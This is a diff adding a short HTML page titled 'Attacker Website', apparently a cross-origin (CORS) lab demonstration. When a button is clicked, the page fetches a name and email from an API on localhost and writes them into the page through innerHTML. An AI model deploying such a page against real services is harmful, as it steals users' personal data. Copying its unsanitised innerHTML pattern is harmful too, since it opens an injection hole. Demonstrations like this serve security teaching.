@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>Attacker</title>
+</head>
+
+<body>
+
+    <h1>Attacker Website</h1>
+
+    <button onclick="getData()">Get Data</button>
+
+    <p id="result"></p>
+
+    <script>
+
+        function getData() {
+
+            fetch("http://localhost:8000/api.php")
+                .then(function(response) {
+                    return response.json();
+                })
+                .then(function(data) {
+
+                    document.getElementById("result").innerHTML =
+                        data.name + "<br>" + data.email;
+
+                });
+
+        }
+
+    </script>
+
+</body>
+
+</html>
